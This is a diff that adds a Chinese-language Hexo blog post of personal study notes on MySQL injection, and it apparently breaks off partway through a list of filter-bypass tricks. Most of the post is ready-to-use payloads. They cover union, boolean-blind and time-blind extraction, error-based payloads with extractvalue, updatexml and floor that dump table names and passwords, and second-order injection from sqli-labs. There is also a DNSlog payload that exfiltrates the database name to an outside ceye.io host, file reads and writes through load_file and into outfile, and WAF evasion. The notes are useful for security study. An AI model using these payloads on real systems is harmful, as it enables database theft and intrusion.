@@ -1,0 +1,859 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ja1e.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="SQL注入学习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入">
+<meta property="og:url" content="https://ja1e.github.io/2021/11/23/sql%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Ja1e">
+<meta property="og:description" content="SQL注入学习">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-11-23T11:20:33.000Z">
+<meta property="article:modified_time" content="2022-07-08T08:56:54.867Z">
+<meta property="article:author" content="Ja1e">
+<meta property="article:tag" content="web安全">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://ja1e.github.io/2021/11/23/sql%E6%B3%A8%E5%85%A5/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>SQL注入 | Ja1e</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ja1e</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Ja1e的博客</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ja1e.github.io/2021/11/23/sql%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Ja1e">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ja1e">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL注入
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-11-23 19:20:33" itemprop="dateCreated datePublished" datetime="2021-11-23T19:20:33+08:00">2021-11-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-07-08 16:56:54" itemprop="dateModified" datetime="2022-07-08T16:56:54+08:00">2022-07-08</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+                </span>
+            </span>
+
+          
+            <div class="post-description">SQL注入学习</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="数据库结构"><a href="#数据库结构" class="headerlink" title="数据库结构"></a>数据库结构</h1><p>Access：</p>
+<ul>
+<li>表名<ul>
+<li>列名<ul>
+<li>数据</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>mysql、mssql、Oracle、MongoDB：</p>
+<ul>
+<li>数据库名<ul>
+<li>表名<ul>
+<li>列名<ul>
+<li>数据</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="MYSQL注入"><a href="#MYSQL注入" class="headerlink" title="MYSQL注入"></a>MYSQL注入</h1><h2 id="查询方式"><a href="#查询方式" class="headerlink" title="查询方式"></a>查询方式</h2><h3 id="select查询语句"><a href="#select查询语句" class="headerlink" title="select查询语句"></a>select查询语句</h3><p>在网站应用中进行数据显示查询操作。</p>
+<p><strong>查库</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT schema_name FROM information_schema.schemata</span><br></pre></td></tr></table></figure>
+
+<p><strong>查表</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT table_name FROM information_schema.tables WHERE table_schema=&#x27;security&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>查列</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name FROM information_schema.columns WHERE table_name=&#x27;users&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>查字段</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username FROM security.users</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="insert插入语句"><a href="#insert插入语句" class="headerlink" title="insert插入语句"></a>insert插入语句</h3><p>在网站应用中进行用户注册添加等操作。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO news(id,url,name) VALUES(2,&#x27;x&#x27;,&#x27;abc&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="delete删除语句"><a href="#delete删除语句" class="headerlink" title="delete删除语句"></a>delete删除语句</h3><p>后台管理里面删除文章删除用户等操作。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM news WHERE id=1;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="update更新数据"><a href="#update更新数据" class="headerlink" title="update更新数据"></a>update更新数据</h3><p>会员或后台中心数据同步或缓存等操作。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE user SET pwd=123 WHERE id=2 and username=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="有回显注入"><a href="#有回显注入" class="headerlink" title="有回显注入"></a>有回显注入</h2><p><strong>联合查询</strong></p>
+<p>查列数：order by 4</p>
+<p>联合查询：union select 1,2,3,……</p>
+<p>在有回显的数字替换成查询语句即可。</p>
+<h2 id="无回显盲注"><a href="#无回显盲注" class="headerlink" title="无回显盲注"></a>无回显盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>regexp、like、ascii、left、ord、mid</p>
+<p>一般配合py脚本注入。</p>
+<p>猜<strong>当前数据库名</strong>第一位字母：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and left(database(),1)=&#x27;s&#x27;--+ </span><br><span class="line">&#x27;and substr(database(),1,1)=&#x27;s&#x27;--+</span><br><span class="line">&#x27;and ascii(substr(database(),1,1))=115--+ </span><br></pre></td></tr></table></figure>
+
+<p>猜<strong>第六个数据库名</strong>的第一个字母的ascii码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and ascii(substr((select schema_name from information_schema.schemata limit 5,1),1,1))=115--+</span><br></pre></td></tr></table></figure>
+
+<p>判断security库中的第四个表的数据的第一位的ascii码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),1,1))&gt;11--+</span><br></pre></td></tr></table></figure>
+
+<p>判断表中<strong>字段</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and ascii(substr((select column_name from information_schema.columns where table_name = &#x27;security&#x27; limit 1,1),1,1))&gt;10--+</span><br><span class="line">&#x27;and ascii(substr((select username from security.users limit 0,1),1,1))&gt;10--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>if、sleep</p>
+<p>一般配合py脚本注入。</p>
+<table>
+<thead>
+<tr>
+<th>payload</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>?id&#x3D;1’ and if (ascii(substring(database(),1,1))&#x3D;67,sleep(5),1)–+</td>
+<td>通过ascii码来比较</td>
+</tr>
+<tr>
+<td>?id&#x3D;1’ and if (hex(substring(database(),1,1))&#x3D;FF,sleep(5),1)–+</td>
+<td>通过十六进制值来比较</td>
+</tr>
+<tr>
+<td>?id&#x3D;1’ and if (mid(database(),1,1)&#x3D;’s’,sleep(5),1)–+</td>
+<td>使用mid函数代替substr</td>
+</tr>
+<tr>
+<td>?id&#x3D;1’ and if (substr(database(),1,1)&#x3D;’s’,sleep(5),1)–+</td>
+<td></td>
+</tr>
+<tr>
+<td>?id&#x3D;1’ and if (left(database(),2)&#x3D;’se’,sleep(5),1)–+</td>
+<td>截取左边两个个字符</td>
+</tr>
+<tr>
+<td>?id&#x3D;1’ and if (right(database(),2)&#x3D;’ty’,sleep(5),1)–+</td>
+<td>截取右边两个字符</td>
+</tr>
+</tbody></table>
+<p>判断是否存在漏洞：’and sleep(5)–+</p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>页面无法显示数据库的信息，但是源码中有mysql输出错误的函数把mysql的错误回显到前端，也就是有报错内容的。<br>报错注入形式上一般是做两个嵌套的查询，里面的那个查询被称为子查询，执行顺序也是从子查询开始的，所以我们可以通过子查询查询我们想要的数据，然后在通过报错函数将我们查询到的数据带出，从而达到爆出想要查询的数据。</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/bc35f8dd4f7c">12种报错注入+万能语句 - 简书 (jianshu.com)</a></p>
+<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h4><p>mysql版本号大于5.1.5</p>
+<p>对XML文档进行查询的函数。</p>
+<p><code>EXTRACTVALUE(XML_document,XPath_string)</code>：从<code>XML_document</code>中返回所包含查询值的<code>XPath_string</code>。</p>
+<p>第二个参数<code>XPath_String</code>是报错的关键，XML文档中查找字符位置是用<code>/xxx/xxx/xxx</code>这种格式，如果我们写入非法格式的内容就会报错，并且返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p>
+<p>paylaod：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXTRACTVALUE(&#x27;anything&#x27;,[查询语句])</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>concat()</code>能使查询语句输出的更加完整。</p>
+<p><code>extractvalue()</code>报错一次只能回显出32位的数据，如果想要回显超过32位的数据，需要使用<code>substr(), mid(), left(), right()</code>之类的截断函数去截断数据分次输出。</p>
+<p><strong>爆数据库名</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and extractvalue(1,concat(0x7e,(select database())))--+</span><br></pre></td></tr></table></figure>
+
+<p><strong>爆表名</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+</span><br></pre></td></tr></table></figure>
+
+<p><strong>爆列名</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)))--+</span><br></pre></td></tr></table></figure>
+
+<p><strong>爆数据</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and extractvalue(1,concat(0x7e,(select group_concat(password) from users)))--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h4><p>mysql版本号大于5.1.5</p>
+<p>更新XML文档的函数。</p>
+<p><code>UPDATEXML(XML_document,XPath_string,new_value);</code></p>
+<p><code>updatexml()</code>的报错注入姿势和<code>extractvalue()</code>类似，也是第二个参数位置，输入非法字符，导致报错。</p>
+<p>updatexml()和extractvalue()相同一次只能输出<code>32</code>位数据，要完整的输出数据只能使用截断函数进行截断分多次输出。</p>
+<p><strong>爆数据库名</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and updatexml(1,concat(0x7e,(select database())),0x7e)--+</span><br></pre></td></tr></table></figure>
+
+<p><strong>爆表名</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e)--+</span><br></pre></td></tr></table></figure>
+
+<p><strong>爆列名</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;users&#x27;)),0x7e)--+</span><br></pre></td></tr></table></figure>
+
+<p><strong>爆数据</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and updatexml(1,concat(0x7e,(select group_concat(password)from users)),0x7e)--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/235496.html">Mysql报错注入之floor(rand(0)*2)报错原理探究 - FreeBuf网络安全行业门户</a></p>
+<blockquote>
+<p>这里需要先了解几个函数：<br>rand()随机函数，返回0~1之间的某个值<br>floor(a)取整函数，返回小于等于a,且值最接近a的一个整数<br>count()聚合函数也称作计数函数，返回查询对象的总数<br>group by x 分组语句，按照查询结果分组</p>
+</blockquote>
+<p>报错语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from users group by concat(database(),floor(rand(0)*2));</span><br><span class="line">select count(*),concat(database(),floor(rand(0)*2)) as x from users group by x;</span><br></pre></td></tr></table></figure>
+
+<p>上面两句的含义是一模一样的，第二句只是把<code>concat(database(),floor(rand(0)*2))</code> 当做了<code>x</code>。</p>
+<ul>
+<li><code>floor(rand(0)*2))</code>：rand()函数每次产生的数都不同，但是通过一个固定的随机数的种子0之后，rand(0)可以形成固定的伪随机序列。所以<code>floor(rand(0)*2)</code>就会产生固定的数列<code>011011</code>。</li>
+<li><code>group_by</code>：通过group by进行分组排序，结果会进行分组，相同名字为合并。</li>
+<li><code>count(*)</code>：计数。</li>
+</ul>
+<p>对于语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from users group by (floor(rand(0)*2));</span><br></pre></td></tr></table></figure>
+
+<p>小tips：<strong>在使用group by的时候，floor(rand(0)*2)会被执行一次，如果虚表不存在记录，插入虚表的时候floor(rand(0)*2)会再被执行一次</strong></p>
+<p>执行流程：<code>floor(rand(0)*2))</code>第一次计算是0，虚表没有，于是插入虚表，注意此时<code>floor(rand(0)*2))</code>又会计算一次(第二次计算)，结果为1，所以插入虚表的值是1；然后<code>floor(rand(0)*2))</code>第三次计算结果是1，虚表里有，于是<code>count</code>直接加1；<code>floor(rand(0)*2))</code>第四次计算是0，虚表没有，于是插入虚表，此时<code>floor(rand(0)*2))</code>会再次计算（第五次计算）然后插入虚表，此时结果是1，但是虚表里已经有1了，所以导致了主键重复报错。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">报错信息：ERROR 1062 (23000): Duplicate entry &#x27;1&#x27; for key &#x27;&lt;group_key&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>爆数据库名：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and (select count(*) from users group by concat(database(),floor(rand(0)*2)))--+</span><br></pre></td></tr></table></figure>
+
+<p><strong>爆表名：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and (select count(*) from users group by concat((select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2)))--+</span><br></pre></td></tr></table></figure>
+
+<p><strong>爆列名：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and (select count(*) from users group by concat((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),floor(rand(0)*2)))--+</span><br></pre></td></tr></table></figure>
+
+<p><strong>爆数据：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and (select count(*) from users group by concat((select password from security.users limit 0,1),floor(rand(0)*2)))--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>原理：攻击者构造恶意的数据并存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。即输入恶意的数据库查询语句时会被转义，但在数据库调用读取语句时又被还原导致语句执行。</p>
+<p><code>sqli-labs_Less24</code>为例：</p>
+<p>先注册一个名为<code>admin&#39;#</code>的用户，然后登录改密码。</p>
+<p>更改密码用的语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这里<code>username</code>是<code>admin&#39;#</code>，所以语句变成了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;$curr_pass&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><code>#</code>后面的都被注释了。变成了更改<code>admin</code>的密码。</p>
+<p>可以用更改后的密码登录admin，或者结合<code>报错/盲注</code>进行数据库注入。</p>
+<h2 id="dnslog注入"><a href="#dnslog注入" class="headerlink" title="dnslog注入"></a>dnslog注入</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Xy--1/p/12896599.html">DNSlog注入学习 - Lushun - 博客园 (cnblogs.com)</a></p>
+<p>我的：<a target="_blank" rel="noopener" href="http://ceye.io/">CEYE - 监控服务以进行安全测试</a></p>
+<p>paylaod：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.xhmmod.ceye.io/abc&#x27;));</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>堆叠注入，顾名思义，就是将语句堆叠在一起进行查询</p>
+<p><code>;</code></p>
+<h2 id="基本函数参考"><a href="#基本函数参考" class="headerlink" title="基本函数参考"></a>基本函数参考</h2><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>解释</th>
+<th>payload</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>database()</td>
+<td>数据库名</td>
+<td></td>
+</tr>
+<tr>
+<td>user()</td>
+<td>用户名</td>
+<td></td>
+</tr>
+<tr>
+<td>version()</td>
+<td>数据库版本</td>
+<td></td>
+</tr>
+<tr>
+<td>@@version_compile_os</td>
+<td>操作系统</td>
+<td></td>
+</tr>
+<tr>
+<td>concat()</td>
+<td>没有分隔符的连接字符串</td>
+<td>concat(a,b)</td>
+</tr>
+<tr>
+<td>concat_ws()</td>
+<td>含有分隔符的连接字符串</td>
+<td>concat_ws(‘:’,a,b)</td>
+</tr>
+<tr>
+<td>group_concat()</td>
+<td>一行显示出来，并以逗号分隔每一条数据</td>
+<td></td>
+</tr>
+<tr>
+<td>left(a,b)</td>
+<td>从左侧截取a的前b位</td>
+<td>left(database(),1)&#x3D;’s’</td>
+</tr>
+<tr>
+<td>right(a,b)</td>
+<td>从右侧截取a的前b位</td>
+<td></td>
+</tr>
+<tr>
+<td>regexp()</td>
+<td>user()的结果是root，regexp为匹配root的正则表达式</td>
+<td>select user() regexp ‘r’</td>
+</tr>
+<tr>
+<td>substr(a,b,c)</td>
+<td>从b位置开始，截取a字符串的c长度</td>
+<td></td>
+</tr>
+<tr>
+<td>mid(a,b,c)</td>
+<td>从b位置开始，截取a字符串的c位</td>
+<td></td>
+</tr>
+<tr>
+<td>length()</td>
+<td>返回字符串的长度</td>
+<td></td>
+</tr>
+<tr>
+<td>ascii()</td>
+<td>将字符串转化为ascii值</td>
+<td>\</td>
+</tr>
+<tr>
+<td>like</td>
+<td>与regexp相似</td>
+<td>select user() like ‘ro%’</td>
+</tr>
+<tr>
+<td>load_file()</td>
+<td>读取本地文件</td>
+<td>select load_file(‘文件路径’)</td>
+</tr>
+<tr>
+<td>into outfile</td>
+<td>写文件(注意&#x2F;&#x2F;双写)</td>
+<td>select ‘句子’ into outfile ‘文件路径及名称’</td>
+</tr>
+</tbody></table>
+<h2 id="注释符使用"><a href="#注释符使用" class="headerlink" title="注释符使用"></a>注释符使用</h2><p>（GET提交方式）：</p>
+<p>　　 – （后面有空格）</p>
+<p>　　 %23</p>
+<p>　　payload结尾单引号闭合</p>
+<p>（POST提交方式）：</p>
+<p>　　 – （后面有空格）</p>
+<p>　　 #</p>
+<p>　　 payload结尾单引号闭合</p>
+<h2 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h2><p>当 <code>union</code>,<code>and</code> 被完全过滤掉了,就可以考虑使用异或注入 </p>
+<p>异或运算规则: </p>
+<p>&#x3D;&#x3D;1^1&#x3D;0	0^0&#x3D;0	0^1&#x3D;1&#x3D;&#x3D;</p>
+<p>1^ 1^1&#x3D;0	1^ 1^0&#x3D;0</p>
+<p>&#x3D;&#x3D;两真为假，两假为真&#x3D;&#x3D;</p>
+<p><code>xor</code> 是逻辑上的异或操作；<code>^</code> 是前后进行二进制层面的异或运算</p>
+<p>0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)</p>
+<hr>
+<h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><ol>
+<li><p>大小写</p>
+</li>
+<li><p>关键字重复（双写）</p>
+</li>
+<li><p>关键字替换</p>
+<p>​	<code>and</code> –&gt; <code>&amp;&amp;</code>        <code>or</code> –&gt; <code>||</code>         <code>like</code>–&gt; <code>=</code>        <code>&lt;&gt;</code>–&gt; <code>!=</code></p>
+</li>
+<li><p>fuzz大法</p>
+</li>
+<li><p>注释符绕过</p>
+<p><code>/**/</code>空格用这个替换</p>
+<p>&#x2F;* 这里可以填写很多内容  *&#x2F; </p>
+<p>内联注释：<code>/*!union select */</code> 里面的东西是可以正常运行的，mysql特性。</p>
+</li>
+<li><p>特殊符号绕过</p>
+<p>mysql 空白符： %09; %0A; %0B; %0D; %20; %0C; %A0; &#x2F;* xxx *&#x2F;</p>
+<p>正则空白符：%09; %0A; %0B; %0D; %20;        %25就是百分号</p>
+<p><code>union%23a%0aselect 1,2,3--+</code></p>
+</li>
+<li><p>函数分割符号  <code>concat/**/()</code>      <code>concat%2520()</code></p>
+</li>
+<li><p>浮点数法      <code>1E0</code>表示 <code>1*10^0</code></p>
+</li>
+<li><p>加密解密</p>
+</li>
+<li><p>编码解码</p>
+</li>
+<li><p>等价函数替换</p>
+</li>
+<li><p>更改提交方式</p>
+</li>
+<li><p>mysql黑语法</p>
+<p>select {x schema_name} from {x information_scheam.schemata};</p>
+<p>select {x 1};</p>
+</li>
+<li><p>当开启了魔术函数&#x3D;&#x3D;过滤了引号&#x3D;&#x3D;时，可以在引号前加上一个汉字双字节编码，可以实现绕过。</p>
+<p>例如构造Payload为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=%BF&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>%BF解码之后是中文乱码</p>
+</li>
+<li><p>用 &#x3D;&#x3D;&#x2F;*!50000%53elect*&#x2F;&#x3D;&#x3D; 代替select实现绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select</span><br><span class="line">/*!50000%53elect*/</span><br><span class="line">order </span><br><span class="line"> /*!50000%6Frder*/</span><br><span class="line">union</span><br><span class="line">/*!50000%75nion*/</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>http参数污染，比如PHP&#x2F;Apache的服务器get方式提交时存在多个相同的参数名，只有最后一个生效。（不同中间件规则不同）</p>
